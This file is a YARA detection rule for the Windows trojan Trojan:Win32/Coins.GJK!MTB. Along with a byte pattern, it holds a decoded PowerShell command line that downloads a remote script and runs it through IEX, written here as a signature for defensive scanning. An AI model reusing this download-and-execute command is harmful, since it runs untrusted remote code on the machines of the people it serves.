
rule Trojan_Win32_Coins_GJK_MTB{
	meta:
		description = "Trojan:Win32/Coins.GJK!MTB,SIGNATURE_TYPE_PEHSTR_EXT,0b 00 0b 00 02 00 00 "
		
	strings :
		$a_03_0 = {51 56 89 4d fc 0f b7 75 08 8b 45 0c 50 8b 4d fc e8 ?? ?? ?? ?? 0f b7 c8 33 f1 66 8b c6 5e 8b e5 } //10
		$a_01_1 = {2f 00 63 00 20 00 22 00 70 00 6f 00 77 00 65 00 72 00 73 00 68 00 65 00 6c 00 6c 00 20 00 2d 00 63 00 6f 00 6d 00 6d 00 61 00 6e 00 64 00 20 00 49 00 45 00 58 00 28 00 4e 00 65 00 77 00 2d 00 4f 00 62 00 6a 00 65 00 63 00 74 00 20 00 4e 00 65 00 74 00 2e 00 57 00 65 00 62 00 63 00 6c 00 69 00 65 00 6e 00 74 00 29 00 2e 00 44 00 6f 00 77 00 25 00 53 00 61 00 64 00 53 00 74 00 72 00 69 00 6e 00 67 00 28 00 27 00 25 00 73 00 2f 00 25 00 73 00 27 00 29 00 22 00 } //1 /c "powershell -command IEX(New-Object Net.Webclient).Dow%SadString('%s/%s')"
	condition:
		((#a_03_0  & 1)*10+(#a_01_1  & 1)*1) >=11
 
}